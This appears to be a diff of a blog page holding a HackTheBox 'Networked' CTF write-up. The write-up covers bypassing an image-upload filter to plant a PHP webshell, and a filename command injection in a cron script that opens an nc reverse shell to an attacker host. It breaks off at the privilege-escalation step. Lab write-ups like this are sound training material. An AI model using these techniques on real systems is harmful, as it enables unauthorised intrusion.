@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  
-    <title>Networked - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
-  
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <head>
+    
+      <title>Networked - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <meta name="description" content="Networking was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration.
-First thing first, let&#39;s add the box IP to the hosts file:
-$ echo &amp;#34;10.10.10.146 networked.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts Let&#39;s go !
-User Flag Recon Let&#39;s start with the classic nmap scan:
+First thing first, let&amp;rsquo;s add the box IP to the hosts file:
+$ echo &amp;#34;10.10.10.146 networked.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts Let&amp;rsquo;s go !
+User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:
 $ nmap -sV -sT -sC networked.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-19 19:47 CEST Nmap scan report for networked.htb (10.10.10.146) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>
 <meta name="keywords" content="hackthebox, ctf, networked, gobuster, php, upload, webshell, weevely, filtering, command-injection, sudo, ifcfg"/>
 <meta name="robots" content="noodp"/>
@@ -20,77 +20,54 @@ $ nmap -sV -sT -sC networked.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019
 
 <link rel="stylesheet" href="/assets/style.css">
 
-  <link rel="stylesheet" href="/assets/green.css">
-
-
 
 <link rel="stylesheet" href="/style.css">
 
 
+
 <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
-
-<link rel="shortcut icon" href="/img/favicon.ico">
-
+<link rel="shortcut icon" href="/img/favicon.png">
 
 
-<meta name="twitter:card" content="summary" />
-<meta name="twitter:title" content="Networked - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." />
-<meta name="twitter:description" content="Networking was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration.
-First thing first, let&#39;s add the box IP to the hosts file:
-$ echo &amp;#34;10.10.10.146 networked.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts Let&#39;s go !
-User Flag Recon Let&#39;s start with the classic nmap scan:
-$ nmap -sV -sT -sC networked.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-19 19:47 CEST Nmap scan report for networked.htb (10.10.10.146) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
-<meta name="twitter:site" content="/" />
-<meta name="twitter:creator" content="hg8" />
-<meta name="twitter:image" content="/img/networked-hackthebox.png">
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Networked - HackTheBox"/>
+<meta name="twitter:description" content="Networking was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration."/>
 
 
-<meta property="og:locale" content="en" />
+
+<meta property="og:title" content="Networked - HackTheBox" />
+<meta property="og:description" content="Networking was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration." />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="Networked - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.">
-<meta property="og:description" content="Networking was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration.
-First thing first, let&#39;s add the box IP to the hosts file:
-$ echo &amp;#34;10.10.10.146 networked.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts Let&#39;s go !
-User Flag Recon Let&#39;s start with the classic nmap scan:
-$ nmap -sV -sT -sC networked.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-19 19:47 CEST Nmap scan report for networked.htb (10.10.10.146) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
 <meta property="og:url" content="/posts/networked/" />
-<meta property="og:site_name" content="Networked - HackTheBox" />
-<meta property="og:image" content="/img/networked-hackthebox.png">
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-
-<meta property="article:published_time" content="2019-11-17 00:00:00 &#43;0000 UTC" />
+<meta property="article:published_time" content="2019-11-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-11-16T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />
 
 
 
 
 
 
-
-
-
-
-
-</head>
-<body class="">
-
-
-<div class="container center headings--one-size">
-
-  <header class="header">
-  <div class="header__inner">
-    <div class="header__logo">
-      <a href="/">
-  <div class="logo">
-    hg8&#39;s Notes
-  </div>
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">./hg8.rocks</span>
+    <span class="logo__cursor"></span>
+  
 </a>
 
-    </div>
-    <div class="menu-trigger">menu</div>
-  </div>
-  
-    <nav class="menu">
+
+    <span class="header__right">
+      
+        
+<nav class="menu">
   <ul class="menu__inner menu__inner--desktop">
     
       
@@ -99,13 +76,20 @@ $ nmap -sV -sT -sC networked.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019
         
       
         
+          <li><a href="/tags">Tags</a></li>
+        
+      
+        
           <li><a href="/about">About</a></li>
         
       
       
     
-
-    
+    <li>
+<a href="/search" title="Search">
+<img src="/icon/search.svg" alt="search" height="24">
+</a>
+<li>
   </ul>
 
   <ul class="menu__inner menu__inner--mobile">
@@ -115,77 +99,105 @@ $ nmap -sV -sT -sC networked.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019
       
     
       
-        <li><a href="/about">About</a></li>
+        <li><a href="/tags">Tags</a></li>
       
     
+      
+        <li><a href="/about">About</a></li>
+      
     
   </ul>
 </nav>
 
-  
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
 </header>
 
 
-  <div class="content">
-    
-<div class="post">
-  <h1 class="post-title">
-    <a href="/posts/networked/">Networked - HackTheBox</a></h1>
-  <div class="post-meta">
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h2 class="post-title"><a href="/posts/networked/">Networked - HackTheBox</a></h2>
+    <div class="post-meta">
       
-    <span class="post-date">
-      2019-11-17
-    </span>
-    
-    
-    <span class="post-author">::
-      hg8
-    </span>
-    
-  </div>
+        <span class="post-date">
+          2019-11-16
+        </span>
 
-  
-  <span class="post-tags">
-    
-    #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
-    
-    #<a href="/tags/ctf/">ctf</a>&nbsp;
-    
-    #<a href="/tags/networked/">networked</a>&nbsp;
-    
-    #<a href="/tags/gobuster/">gobuster</a>&nbsp;
-    
-    #<a href="/tags/php/">php</a>&nbsp;
-    
-    #<a href="/tags/upload/">upload</a>&nbsp;
-    
-    #<a href="/tags/webshell/">webshell</a>&nbsp;
-    
-    #<a href="/tags/weevely/">weevely</a>&nbsp;
-    
-    #<a href="/tags/filtering/">filtering</a>&nbsp;
-    
-    #<a href="/tags/command-injection/">command-injection</a>&nbsp;
-    
-    #<a href="/tags/sudo/">sudo</a>&nbsp;
-    
-    #<a href="/tags/ifcfg/">ifcfg</a>&nbsp;
-    
-  </span>
-  
+        
+          
+        
+      
 
-  
-  <img src="/img/networked-hackthebox.png" class="post-cover" />
-  
+      <span class="post-author">— Written by hg8</span>
+      
+        <span class="post-read-time">— 9 min read</span>
+      
+    </div>
 
-  <div class="post-content"><div>
-        <p>Networking was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration.</p>
-<p>First thing first, let's add the box IP to the hosts file:</p>
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+          #<a href="/tags/ctf/">ctf</a>&nbsp;
+        
+          #<a href="/tags/networked/">networked</a>&nbsp;
+        
+          #<a href="/tags/gobuster/">gobuster</a>&nbsp;
+        
+          #<a href="/tags/php/">php</a>&nbsp;
+        
+          #<a href="/tags/upload/">upload</a>&nbsp;
+        
+          #<a href="/tags/webshell/">webshell</a>&nbsp;
+        
+          #<a href="/tags/weevely/">weevely</a>&nbsp;
+        
+          #<a href="/tags/filtering/">filtering</a>&nbsp;
+        
+          #<a href="/tags/command-injection/">command-injection</a>&nbsp;
+        
+          #<a href="/tags/sudo/">sudo</a>&nbsp;
+        
+          #<a href="/tags/ifcfg/">ifcfg</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/img/networked-hackthebox.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <p>Networking was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration.</p>
+<p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.146 networked.htb&#34;</span> &gt;&gt; /etc/hosts
-</code></pre></div><p>Let's go !</p>
-<h1 id="user-flag">User Flag<a href="#user-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
-<h2 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>Let's start with the classic <code>nmap</code> scan:</p>
+</code></pre></div><p>Let&rsquo;s go !</p>
+<h1 id="user-flag">User Flag</h1>
+<h2 id="recon">Recon</h2>
+<p>Let&rsquo;s start with the classic <code>nmap</code> scan:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC networked.htb
 Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-19 19:47 CEST
 Nmap scan report <span style="color:#66d9ef">for</span> networked.htb <span style="color:#f92672">(</span>10.10.10.146<span style="color:#f92672">)</span>
@@ -197,11 +209,11 @@ PORT    STATE  SERVICE VERSION
 </code></pre></div><p>Seems like we have something super classical: A http (port 80) and SSH (port 22) service open.</p>
 <p>Opening <a href="http://networked.htb">http://networked.htb</a> display the following message :</p>
 <blockquote>
-<p>Hello mate, we're building the new FaceMash!
+<p>Hello mate, we&rsquo;re building the new FaceMash!
 Help by funding us and be the new Tyler&amp;Cameron!
 Join us at the pool party this Sat to get a glimpse</p>
 </blockquote>
-<p>No useful informations in this message. Let's continue our recon phase with a HTTP enumeration.</p>
+<p>No useful informations in this message. Let&rsquo;s continue our recon phase with a HTTP enumeration.</p>
 <p>As usual use <code>gobuster</code>. I add the <code>-x php</code> parameter to make sure we get all files with this extension :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u http://networked.htb -w ~/SecLists/Discovery/Web-Content/big.txt -x php
 <span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
@@ -221,7 +233,7 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 /uploads <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
 </code></pre></div><p>The <code>/backup</code> endpoint is promising. Once opening it we find an archive :</p>
 <p><img src="https://user-images.githubusercontent.com/9076747/67149664-317cbb00-f2ae-11e9-961d-579ad1cdd818.png" alt="Networked backup page"></p>
-<p>Let's download it and check what's inside:</p>
+<p>Let&rsquo;s download it and check what&rsquo;s inside:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget http://networked.htb/backup/backup.tar
 2019-10-19 19:57:46 <span style="color:#f92672">(</span>65.6 MB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;backup.tar&#39;</span> saved <span style="color:#f92672">[</span>10240/10240<span style="color:#f92672">]</span>
 $ tar -xvf backup.tar
@@ -229,10 +241,10 @@ index.php
 lib.php
 photos.php
 upload.php
-</code></pre></div><p>It's a backup of the website. Seems like <code>gobuster</code> did a good job since it already found each of those files.</p>
+</code></pre></div><p>It&rsquo;s a backup of the website. Seems like <code>gobuster</code> did a good job since it already found each of those files.</p>
 <p>Upon investigating the file we find that <code>upload.php</code> is &hellip;well&hellip; a upload page. It accepts only image and part of the code that check the validity of the sent file is written in <code>lib.php</code> alongside various functions.</p>
 <p><code>photos.php</code> is used to display uploaded images.</p>
-<p>First thing that come to mind here is to try to upload a php webshell through the <code>upload.php</code> page. Let's check the rules that validate if a file is valid or not :</p>
+<p>First thing that come to mind here is to try to upload a php webshell through the <code>upload.php</code> page. Let&rsquo;s check the rules that validate if a file is valid or not :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if (!(check_file_type($_FILES[&#34;myFile&#34;]) <span style="color:#960050;background-color:#1e0010">&amp;</span><span style="color:#960050;background-color:#1e0010">&amp;</span> filesize($_FILES[&#39;myFile&#39;][&#39;tmp_name&#39;]) &lt; <span style="color:#f92672">60000</span><span style="color:#960050;background-color:#1e0010">)</span><span style="color:#960050;background-color:#1e0010">)</span> <span style="color:#960050;background-color:#1e0010">{</span>
   <span style="color:#a6e22e">echo</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">pre</span>&gt;Invalid image file.&lt;/<span style="color:#f92672">pre</span>&gt;&#39;;
 }
@@ -244,7 +256,7 @@ upload.php
       return false;
   }
 }
-</code></pre></div><p>The first check consist in a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME type</a> check of the file. If the file MIME type doesn't contain <code>image/</code> it will be defined as invalid.</p>
+</code></pre></div><p>The first check consist in a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME type</a> check of the file. If the file MIME type doesn&rsquo;t contain <code>image/</code> it will be defined as invalid.</p>
 <p>This check means that the image will be validated locally, so no request edition will help to smuggle a PHP Shell (by editing <code>Content-Type</code> header for example).</p>
 <p>Scrolling through the code we notice a second check :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$validext = array(&#39;.jpg&#39;, &#39;.png&#39;, &#39;.gif&#39;, &#39;.jpeg&#39;);
@@ -255,9 +267,9 @@ foreach ($validext as $vext) {
   }
 }
 </code></pre></div><p>This one check do compare the end of the filename to see if it end with the common <code>.jpg</code>, <code>.png</code>, <code>.gif</code> and <code>.jpeg</code>. If not, the file is defined invalid and not uploaded.</p>
-<p>Alright, with all those information in mind let's try to craft one malicious image :)</p>
-<h2 id="file-upload-vulnerability">File upload vulnerability<a href="#file-upload-vulnerability" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<h3 id="bypass-first-check-mime-type">Bypass First Check: MIME Type<a href="#bypass-first-check-mime-type" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Alright, with all those information in mind let&rsquo;s try to craft one malicious image :)</p>
+<h2 id="file-upload-vulnerability">File upload vulnerability</h2>
+<h3 id="bypass-first-check-mime-type">Bypass First Check: MIME Type</h3>
 <p>The easiest way to do so is to take a valid image and append the malicious content at the end of the file. It can be done in various way. Here how I did:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># Download most basic jpg image possible</span>
 $ wget https://raw.githubusercontent.com/mathiasbynens/small/master/jpeg.jpg -O hg8.jpeg
@@ -266,21 +278,21 @@ $ cat hg82.jpeg
 ����C
 ��
  ���?�� ��&lt;?php phpinfo<span style="color:#f92672">(</span><span style="color:#f92672">)</span>; ?&gt;
-</code></pre></div><h3 id="bypass-second-check-file-extension">Bypass Second Check: File extension**<a href="#bypass-second-check-file-extension" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+</code></pre></div><h3 id="bypass-second-check-file-extension">Bypass Second Check: File extension**</h3>
 <p>A common vulnerability in php file upload form is the &ldquo;double extension&rdquo; :</p>
 <blockquote>
 <p>In Apache, a php file might be executed using the double extension technique such as &ldquo;file.php.jpg.
 <a href="https://www.owasp.org/index.php/Unrestricted_File_Upload">Unrestricted File Upload</a></p>
 </blockquote>
-<p>And that's exactly what we are going to do. The second check will pass because our file extension will be <code>.jpg</code> but the php code inside will still get executed:</p>
+<p>And that&rsquo;s exactly what we are going to do. The second check will pass because our file extension will be <code>.jpg</code> but the php code inside will still get executed:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mv hg8.jpg hg8.php.jpg
 </code></pre></div><p>We are ready to upload now! Everything seems to went fine since we get the following message : <code>file uploaded, refresh gallery</code>. The gallery is the <code>photos.php</code> endpoint. Opening this page display a list of recently uploaded files and one with the <code>.php.jpg</code> extension get the attention.</p>
 <p>In the <code>upload.php</code> file we got information about the location of stored images :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">define(&#34;UPLOAD_DIR&#34;, &#34;/var/www/html/uploads/&#34;);
-</code></pre></div><p>We have the location of the upload folder and the name of the file. Let's open it ! Mine is at <a href="http://networked.htb/uploads/10_10_15_101.php.jpg">http://networked.htb/uploads/10_10_15_101.php.jpg</a></p>
+</code></pre></div><p>We have the location of the upload folder and the name of the file. Let&rsquo;s open it ! Mine is at <a href="http://networked.htb/uploads/10_10_15_101.php.jpg">http://networked.htb/uploads/10_10_15_101.php.jpg</a></p>
 <p><img src="https://user-images.githubusercontent.com/9076747/67150075-50318080-f2b3-11e9-8195-26034691deeb.png" alt="Networked upload"></p>
-<h3 id="pivot-php-webshell---user">Pivot PHP Webshell -&gt; User<a href="#pivot-php-webshell---user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<p>Now that we have a working process let's replace the <code>phpinfo()</code> by a webshell and we can easily land a shell running as <code>apache</code> user :</p>
+<h3 id="pivot-php-webshell---user">Pivot PHP Webshell -&gt; User</h3>
+<p>Now that we have a working process let&rsquo;s replace the <code>phpinfo()</code> by a webshell and we can easily land a shell running as <code>apache</code> user :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">networked.htb:/var/www/html/uploads $ id
 uid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>48<span style="color:#f92672">(</span>apache<span style="color:#f92672">)</span>
 </code></pre></div><p>The first thing I do after landing a webshell is to check the <code>/etc/password</code> file to find the user we will need to pivot to for finding our flag.</p>
@@ -289,7 +301,7 @@ root:x:0:0:root:/root:/bin/bash
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 guly:x:1000:1000:guly:/home/guly:/bin/bash
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-</code></pre></div><p>Beside <code>root</code> the only user to have a shell setup is <code>guly</code>. It's our new target ;)</p>
+</code></pre></div><p>Beside <code>root</code> the only user to have a shell setup is <code>guly</code>. It&rsquo;s our new target ;)</p>
 <p>First we will check if <code>guly</code> have any interesting file in his home folder :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls -l /home/guly
 total <span style="color:#ae81ff">16</span>
@@ -302,7 +314,7 @@ total <span style="color:#ae81ff">16</span>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /home/guly/crontab.guly
 */3 * * * * php /home/guly/check_attack.php
 </code></pre></div><p>The cronjob run the <code>check_attack.php</code> script every 3 minutes.</p>
-<p>We don't have write access to the script so we are not able to edit it to inject command. Since we have read access let's investigate to see if we can find a vulnerability in the runtime :</p>
+<p>We don&rsquo;t have write access to the script so we are not able to edit it to inject command. Since we have read access let&rsquo;s investigate to see if we can find a vulnerability in the runtime :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
 <span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#39;/var/www/html/lib.php&#39;</span>;
 $path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/www/html/uploads/&#39;</span>;
@@ -325,18 +337,18 @@ $files <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_gre
 
 <span style="color:#75715e">?&gt;</span>
 </code></pre></div><p>Three <code>exec</code> calls, we will surely find a way to inject something&hellip;</p>
-<p>First exec (<code>exec(&quot;rm -f $logpath&quot;);)</code> can't do anything since <code>$logpath</code> is harcoded.</p>
+<p>First exec (<code>exec(&quot;rm -f $logpath&quot;);)</code> can&rsquo;t do anything since <code>$logpath</code> is harcoded.</p>
 <p>Second exec (<code>exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);</code> is already more interesting. Reading thought the code we understand that <code>$value</code> is dynamically fetched from the filenames of files present in the <code>/var/www/html/uploads/</code> folder.</p>
 <p>For example with our previously uploaded image file (<code>hg8.php.jpg</code>) the executed command will be :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">exec(&#34;nohup /bin/rm -f /var/www/html/uploads/hg8.php.jpg &gt; /dev/null 2&gt;<span style="color:#960050;background-color:#1e0010">&amp;</span>1 &amp;&#34;);
 </code></pre></div><p>So if we are a file named, for example, <code>; sleep 5 ;</code> here is what the executed command will be:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">exec(&#34;nohup /bin/rm -f /var/www/html/uploads/; sleep 5 ; &gt; /dev/null 2&gt;<span style="color:#960050;background-color:#1e0010">&amp;</span>1 &amp;&#34;);
-</code></pre></div><p>Since we have write access to the <code>/var/www/html/uploads/</code> folder let's try it out with a reverse shell.</p>
-<p>Firstly let's open our listener :</p>
+</code></pre></div><p>Since we have write access to the <code>/var/www/html/uploads/</code> folder let&rsquo;s try it out with a reverse shell.</p>
+<p>Firstly let&rsquo;s open our listener :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># On attacker console</span>
 $ nc -l -vv -p <span style="color:#ae81ff">8544</span>
 Listening on any address <span style="color:#ae81ff">8544</span>
-</code></pre></div><p>And let's create our &lsquo;malicious&rsquo; file :</p>
+</code></pre></div><p>And let&rsquo;s create our &lsquo;malicious&rsquo; file :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">networked.htb:/var/www/html/uploads$ touch <span style="color:#e6db74">&#34;; nc 10.10.10.10 8544 -c bash ;&#34;</span>
 </code></pre></div><p>We wait a little bit for the cronjob to run and surely a new connection open on our listener :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8544</span>
@@ -346,8 +358,8 @@ Connection from 10.10.10.146:52024
 uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>guly<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>guly<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>guly<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>guly@networked ~<span style="color:#f92672">]</span>$ cat user.txt
 526cxxxxxxxxxxx1c5
-</code></pre></div><h1 id="root-flag">Root Flag<a href="#root-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
-<h2 id="recon-1">Recon<a href="#recon-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+</code></pre></div><h1 id="root-flag">Root Flag</h1>
+<h2 id="recon-1">Recon</h2>
 <p>To make the recon task easier, we are going to use the <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux enumeration tool</a>. For the transfer of the script we will setup a simple http server on our attacking machine:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># In attacker console</span>
 $ wget <span style="color:#e6db74">&#34;https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh&#34;</span> -O lse.sh
@@ -357,7 +369,7 @@ Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style
 $ <span style="color:#75715e"># In reverse shell</span>
 <span style="color:#f92672">[</span>guly@networked<span style="color:#f92672">]</span>$ wget 10.10.10.10:8000/lse.sh -O /tmp/lse.sh
 2019-10-17 08:00:49 <span style="color:#f92672">(</span><span style="color:#ae81ff">527</span> KB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;/tmp/lse.sh&#39;</span> saved <span style="color:#f92672">[</span>31736/31736<span style="color:#f92672">]</span>
-</code></pre></div><p>Let's run the script to see if we can find anything intesrresting :</p>
+</code></pre></div><p>Let&rsquo;s run the script to see if we can find anything intesrresting :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>guly@networked<span style="color:#f92672">]</span>$ bash /tmp/lse.sh
 
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
@@ -371,7 +383,7 @@ User guly may run the following commands on networked:
 </code></pre></div><p>We notice a very interesting configuration here. The script <code>/usr/local/sbin/changename.sh</code> can be run as <code>root</code> without password through sudo. If we can edit or find a flaw in this script it will be our pass to the root flag.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>guly@networked tmp<span style="color:#f92672">]</span>$ ls -l /usr/local/sbin/changename.sh
 -rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">422</span> Jul  <span style="color:#ae81ff">8</span> 12:34 /usr/local/sbin/changename.sh
